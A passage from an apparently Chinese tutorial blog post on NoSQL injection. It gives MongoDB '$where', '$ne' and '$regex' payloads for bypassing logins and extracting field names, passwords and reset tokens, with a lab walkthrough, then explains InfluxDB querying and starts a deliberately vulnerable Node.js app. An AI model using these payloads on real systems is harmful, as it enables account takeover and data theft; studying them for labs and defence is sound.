</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;peter&#34;</span><span class="p">,</span> <span class="nt">&#34;$where&#34;</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">如果存在差异，则存在注入</span>
</span></span></code></pre></div>
<h4 class="relative group">提取字段名称 
    <div id="提取字段名称" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8f%90%e5%8f%96%e5%ad%97%e6%ae%b5%e5%90%8d%e7%a7%b0" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="si">$where</span><span class="s2">&#34;</span><span class="o">:</span><span class="s2">&#34;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&#34;</span>
</span></span></code></pre></div><p>这将检查用户对象中的第一个数据字段并返回字段名称的第一个字符。这使您能够逐字符提取字段名称</p>

<h3 class="relative group">lab 
    <div id="lab" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#lab" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>首先说一下大概的思路，也就是利用前面的{$ne:&rsquo;&rsquo;}构造一个万能密码，会发现登录不了也就是（Account locked）需要reset password，这个时候我们直接利用语句<code>&quot;$where&quot;:&quot;Object.keys(this)[1].match('^.{}.*')&quot;</code>来获取json的名称，类似于</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxx&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxxx&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;forgetPWD&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxx&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>中的username,password，我们给对方的邮箱发送重置密码，然后利用上面的语句查出来我们需要的东西是在第几个key之中（其实就是判断他是否存在这个东西）例如这里的forgetpwd就是key</p>
\[3\]<p>我们需要里面的值就可以再使用语句：&quot;$where&quot;:&ldquo;this.forgetPWD.match(&rsquo;^.{1}1.*&rsquo;)&ldquo;在数字一填入参数来进行爆破最终获取数据，因为我这里的lab响应太慢了我这里直接放一个视频链接可以去看看具体操作 :  <a
  href="https://www.youtube.com/watch?v=fyOzoqd2hl4"
    target="_blank"
  >https://www.youtube.com/watch?v=fyOzoqd2hl4</a></p>

<h2 class="relative group">javascript运算符提取数据 
    <div id="javascript运算符提取数据" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#javascript%e8%bf%90%e7%ae%97%e7%ac%a6%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>或者，您也可以使用无法运行 JavaScript 的运算符来提取数据。例如，您可以使用 <code>$regex</code>运算符逐字符提取数据。</p>
<p>考虑一个易受攻击的应用程序，它接受请求正文中的用户名和密码<code>POST</code>。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;myuser&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;mypass&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>您可以首先测试运算符是否<code>$regex</code>被处理，如下所示：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span><span class="s2">&#34;^.*&#34;</span><span class="p">}}</span>
</span></span></code></pre></div><p>如果对此请求的响应与您提交错误密码时收到的响应不同，则表明该应用程序可能存在漏洞。您可以使用<code>$regex</code>运算符逐字符提取数据。例如，以下有效负载检查密码是否以 开头 <code>a</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span><span class="s2">&#34;^a*&#34;</span><span class="p">}}</span>
</span></span></code></pre></div><p>当然原理是一样的
以上的注入都是基于mangodb的语法，接下来是一种（权新版本）</p>
<hr>

<h1 class="relative group">InfluxDB 
    <div id="influxdb" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#influxdb" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>在正式注入之前，我们先要了解一些关于influxdb必要的知识（主要是这个数据库确实比较冷门，但是不排除ctf会考）</p>

<h2 class="relative group">什么是InfluxDB 
    <div id="什么是influxdb" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%bb%80%e4%b9%88%e6%98%afinfluxdb" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>InfluxDB 是一种流行的开源时间序列数据库，旨在处理大量带时间戳的数据。InfluxDB 广泛用于监控和分析来自传感器、应用程序和物联网设备等各种来源的指标、事件和实时数据。</p>

<h2 class="relative group">influxDB的数据组织 
    <div id="influxdb的数据组织" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#influxdb%e7%9a%84%e6%95%b0%e6%8d%ae%e7%bb%84%e7%bb%87" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>InfluxDB 数据模型将时间序列数据组织到存储桶和测量中。一个桶可以包含多个测量值。测量包含多个标签和字段。</p>
<ul>
<li><strong>Bucket</strong>：存储时间序列数据的指定位置。一个桶可以包含多个_测量值_。
<ul>
<li><strong>测量</strong>：时间序列数据的逻辑分组。给定测量中的所有_点都应具有相同的__标签_。一个测量包含多个_标签_和_字段_。
<ul>
<li><strong>Tags</strong>：键值对，其值不同，但不经常更改。标签用于存储每个点的元数据 - 例如，用于识别数据源（如主机、位置、站点等）的东西。</li>
<li><strong>字段</strong>：键值对，其值随时间变化，例如：温度、压力、股票价格等。</li>
<li><strong>Timestamp</strong>：与数据关联的时间戳。当存储在磁盘上并查询时，所有数据都按时间排序。</li>
</ul>
</li>
</ul>
</li>
</ul>

<h2 class="relative group">写入数据的一些操作 
    <div id="写入数据的一些操作" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%86%99%e5%85%a5%e6%95%b0%e6%8d%ae%e7%9a%84%e4%b8%80%e4%ba%9b%e6%93%8d%e4%bd%9c" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>首先，我们要知道——写入influxdb的数据都是通过一个叫做 <strong>line protocol</strong>（翻译叫做线路协议，感觉翻译的不是很好，所以就直接拿出来，以下简称:LP）
在官方文档中举了一个例子：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Syntax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">measurement</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">tag_key</span><span class="o">&gt;=&lt;</span><span class="nx">tag_value</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">tag_key</span><span class="o">&gt;=&lt;</span><span class="nx">tag_value</span><span class="o">&gt;</span><span class="p">]]</span> <span class="o">&lt;</span><span class="nx">field_key</span><span class="o">&gt;=&lt;</span><span class="nx">field_value</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">field_key</span><span class="o">&gt;=&lt;</span><span class="nx">field_value</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">timestamp</span><span class="o">&gt;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Example
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">myMeasurement</span><span class="p">,</span><span class="nx">tag1</span><span class="o">=</span><span class="nx">value1</span><span class="p">,</span><span class="nx">tag2</span><span class="o">=</span><span class="nx">value2</span> <span class="nx">fieldKey</span><span class="o">=</span><span class="s2">&#34;fieldValue&#34;</span> <span class="mi">1556813561098000000</span>
</span></span></code></pre></div><p>官方文档还提示到：
Line protocol does not support the newline character <code>\n</code> in tag or field values.
也就是<code>\n</code>不支持转义为换行符，而是代表一个单独的point
关于这个协议的一些要素







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql15.png">

  
</figure>
</p>

<h3 class="relative group">measurement 
    <div id="measurement" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#measurement" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>必须存在，且每一个数据点仅接受一个measurement，并且遵循命名规则：
Measurement names, tag keys, and field keys cannot begin with an underscore <code>_</code>. The <code>_</code> namespace is reserved for InfluxDB system use.
它的数据类型为：string</p>

<h3 class="relative group">Tag set 
    <div id="tag-set" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#tag-set" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>【不为必须，可选】该点的所有标签键值对。键值关系用<code>=</code>操作数表示。多个标签键值对以逗号分隔。 _标签键和标签值区分大小写。标签键受到命名限制。标签值不能为空；相反，从标签集中省略该标签。
数据类型：string</p>

<h3 class="relative group">Field set 
    <div id="field-set" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#field-set" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>必须存在，和measurement一样，必须存在至少一个field，字段键和字符串值区分大小写，同样受到命名限制。
数据类型：对于键名：string
对于值：FLOAT INTEGER ULINTEGER STRING BOOLEAN</p>
<p>example(双引号表示filed的值):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">measurementName <span class="nv">fieldKey</span><span class="o">=</span><span class="s2">&#34;field string value&#34;</span> <span class="m">1556813561098000000</span>
</span></span></code></pre></div>
<h3 class="relative group">Timestamp 
    <div id="timestamp" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#timestamp" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>【可选择的】也就是我们常说的时间戳。InfluxDB 接受每个点一个时间戳。如果未提供时间戳，InfluxDB 将使用其主机的系统时间 (UTC)。
数据类型：Unix Timestamp</p>

<h4 class="relative group">关于时间戳的重要说明(from docs) 
    <div id="关于时间戳的重要说明from-docs" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%85%b3%e4%ba%8e%e6%97%b6%e9%97%b4%e6%88%b3%e7%9a%84%e9%87%8d%e8%a6%81%e8%af%b4%e6%98%8efrom-docs" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<ul>
<li>为了确保数据点包含观察指标的时间（未由 InfluxDB 接收），请包含时间戳。</li>
<li>如果您的时间戳不是纳秒，请在将数据写入 InfluxDB时指定时间戳的精度。</li>
</ul>

<h3 class="relative group">其他的一些东西 
    <div id="其他的一些东西" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%85%b6%e4%bb%96%e7%9a%84%e4%b8%80%e4%ba%9b%e4%b8%9c%e8%a5%bf" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h4 class="relative group">Quotes(单引号) 
    <div id="quotes单引号" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#quotes%e5%8d%95%e5%bc%95%e5%8f%b7" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<table>
  <thead>
      <tr>
          <th>Element</th>
          <th>Double quotes</th>
          <th>Single quotes</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Measurement</td>
          <td><em>Limited</em> *</td>
          <td><em>Limited</em> *</td>
      </tr>
      <tr>
          <td>Tag key</td>
          <td><em>Limited</em> *</td>
          <td><em>Limited</em> *</td>
      </tr>
      <tr>
          <td>Tag value</td>
          <td><em>Limited</em> *</td>
          <td><em>Limited</em> *</td>
      </tr>
      <tr>
          <td>Field key</td>
          <td><em>Limited</em> *</td>
          <td><em>Limited</em> *</td>
      </tr>
      <tr>
          <td>Field value</td>
          <td><strong>Strings only</strong></td>
          <td>Never</td>
      </tr>
      <tr>
          <td>Timestamp</td>
          <td>Never</td>
          <td>Never</td>
      </tr>
  </tbody>
</table>

<h4 class="relative group">Special Characters(一些特殊的字符<code>\</code>) 
    <div id="special-characters一些特殊的字符" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#special-characters%e4%b8%80%e4%ba%9b%e7%89%b9%e6%ae%8a%e7%9a%84%e5%ad%97%e7%ac%a6" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>在以下情况下，需要使用反斜杠 ( <code>\</code>) 转义某些字符</p>
<table>
  <thead>
      <tr>
          <th>Element</th>
          <th>Escape characters</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Measurement</td>
          <td>Comma, Space</td>
      </tr>
      <tr>
          <td>Tag key</td>
          <td>Comma, Equals Sign, Space</td>
      </tr>
      <tr>
          <td>Tag value</td>
          <td>Comma, Equals Sign, Space</td>
      </tr>
      <tr>
          <td>Field key</td>
          <td>Comma, Equals Sign, Space</td>
      </tr>
      <tr>
          <td>Field value</td>
          <td>Double quote, Backslash</td>
      </tr>
  </tbody>
</table>

<h3 class="relative group">model of LP 
    <div id="model-of-lp" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#model-of-lp" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>关于这个LP，官方也给出了一个模型，可以用来构建一个LP</p>
<ul>
<li><strong>measurement</strong>: <code>home</code>
<ul>
<li><strong>tags</strong>
<ul>
<li><code>room</code>: Living Room or Kitchen</li>
</ul>
</li>
<li><strong>fields</strong>
<ul>
<li><code>temp</code>: temperature in °C (float)</li>
<li><code>hum</code>: percent humidity (float)</li>
<li><code>co</code>: carbon monoxide in parts per million (integer)</li>
</ul>
</li>
<li><strong>timestamp</strong>: Unix timestamp in <em>second</em> precision</li>
</ul>
</li>
</ul>

<h2 class="relative group">查询的操作 
    <div id="查询的操作" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%9f%a5%e8%af%a2%e7%9a%84%e6%93%8d%e4%bd%9c" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>两种查询语言：</p>
<ul>
<li><strong>Flux</strong>：一种函数式脚本语言，旨在查询和处理来自 InfluxDB 和其他数据源的数据。</li>
<li><strong>InfluxQL</strong>：一种类似 SQL 的查询语言，旨在从 InfluxDB 查询时间序列数据。</li>
</ul>

<h3 class="relative group">Flux语法 
    <div id="flux语法" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#flux%e8%af%ad%e6%b3%95" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h4 class="relative group">基本格式 
    <div id="基本格式" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%9f%ba%e6%9c%ac%e6%a0%bc%e5%bc%8f" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">from</span><span class="p">(</span><span class="nx">bucket</span><span class="o">:</span> <span class="s2">&#34;example-bucket&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="nx">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_measurement</span> <span class="o">==</span> <span class="s2">&#34;example-measurement&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">mean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="k">yield</span><span class="p">(</span><span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;_results&#34;</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li>from(): 从哪个bucket中查询</li>
<li>range(): 根据时间范围过滤数据。Flux 需要“有界”查询——仅限于特定时间范围的查询。</li>
<li>filter(): 根据列值过滤数据。每行由 表示<code>r</code> ，每列由 的属性表示<code>r</code>。可以使用多个过滤器.</li>
<li>yield():输出。</li>
<li>mean():计算每个输入表的列中非空值的平均值<code>_value</code></li>
</ul>

<h4 class="relative group">Pipe-forward operator(管道转发符) 
    <div id="pipe-forward-operator管道转发符" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pipe-forward-operator%e7%ae%a1%e9%81%93%e8%bd%ac%e5%8f%91%e7%ac%a6" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>Flux 使用管道转发运算符 ( <code>|&gt;</code>) 将一个函数的输出作为输入传递到下一个函数作为输入。
docs也是举了一个例子1:
以下 Flux 查询返回存储在<strong>家庭测量中的</strong> <strong>co</strong>、<strong>hum</strong>和<strong>temp</strong>字段，其时间戳<strong>在 2022-01-01T08:00:00Z 和 2022-01-01T20:00:01Z 之间</strong>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">from</span><span class="p">(</span><span class="nx">bucket</span><span class="o">:</span> <span class="s2">&#34;get-started&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="nx">T08</span><span class="o">:</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span><span class="nx">Z</span><span class="p">,</span> <span class="nx">stop</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="nx">T20</span><span class="o">:</span><span class="mi">00</span><span class="o">:</span><span class="mi">01</span><span class="nx">Z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_measurement</span> <span class="o">==</span> <span class="s2">&#34;home&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span><span class="o">==</span> <span class="s2">&#34;co&#34;</span> <span class="nx">or</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">==</span> <span class="s2">&#34;hum&#34;</span> <span class="nx">or</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">==</span> <span class="s2">&#34;temp&#34;</span><span class="p">)</span>
</span></span></code></pre></div>
<h3 class="relative group">influxQL语法 
    <div id="influxql语法" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#influxql%e8%af%ad%e6%b3%95" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>InfluxQL 是一种类 SQL 查询语言，与大多数 SQL 语言类似，但专门设计用于查询 InfluxDB 0.x 和 1.x 中的时间序列数据。</p>

<h4 class="relative group">基本的查询知识 
    <div id="基本的查询知识" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%9f%ba%e6%9c%ac%e7%9a%84%e6%9f%a5%e8%af%a2%e7%9f%a5%e8%af%86" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<ul>
<li><code>SELECT</code>: 指定要查询的字段和标签。</li>
<li><code>FROM</code>: 指定要查询的测量值。使用测量名称或包含数据库和保留策略的完全限定测量名称。例如：<code>db.rp.measurement</code>。</li>
<li><code>WHERE</code>: (可选）根据字段、标签和时间过滤数据。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">co</span><span class="p">,</span><span class="n">hum</span><span class="p">,</span><span class="n">temp</span><span class="p">,</span><span class="n">room</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s2">&#34;get-started&#34;</span><span class="p">.</span><span class="n">autogen</span><span class="p">.</span><span class="n">home</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="s1">&#39;2022-01-01T08:00:00Z&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="s1">&#39;2022-01-01T20:00:00Z&#39;</span><span class="w">
</span></span></span></code></pre></div><p>其实就和sql语句差不多.</p>

<h2 class="relative group">注入利用 
    <div id="注入利用" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%b3%a8%e5%85%a5%e5%88%a9%e7%94%a8" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>经过上面基础知识的学习，想必你已经有了一定的概念，那么我们就开始利用吧</p>

<h3 class="relative group">构建一个易被攻击的web 
    <div id="构建一个易被攻击的web" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%9e%84%e5%bb%ba%e4%b8%80%e4%b8%aa%e6%98%93%e8%a2%ab%e6%94%bb%e5%87%bb%e7%9a%84web" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">InfluxDB</span><span class="p">,</span> <span class="nx">Point</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@influxdata/influxdb-client&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="s1">&#39;REDACTED&#39;</span> <span class="c1">// InfluxDB Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;https://127.0.0.1&#39;</span> <span class="c1">// Local Database endpoint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">org</span> <span class="o">=</span> <span class="s1">&#39;myOrg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">bucket</span> <span class="o">=</span> <span class="s1">&#39;publicBucket&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">InfluxDB</span><span class="p">({</span><span class="nx">url</span><span class="p">,</span> <span class="nx">token</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">results</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">queryApi</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">getQueryApi</span><span class="p">(</span><span class="nx">org</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="kr">await</span> <span class="p">(</span><span class="kr">const</span> <span class="p">{</span><span class="nx">values</span><span class="p">,</span> <span class="nx">tableMeta</span><span class="p">}</span> <span class="k">of</span> <span class="nx">queryApi</span><span class="p">.</span><span class="nx">iterateRows</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">o</span> <span class="o">=</span> <span class="nx">tableMeta</span><span class="p">.</span><span class="nx">toObject</span><span class="p">(</span><span class="nx">values</span><span class="p">)</span>
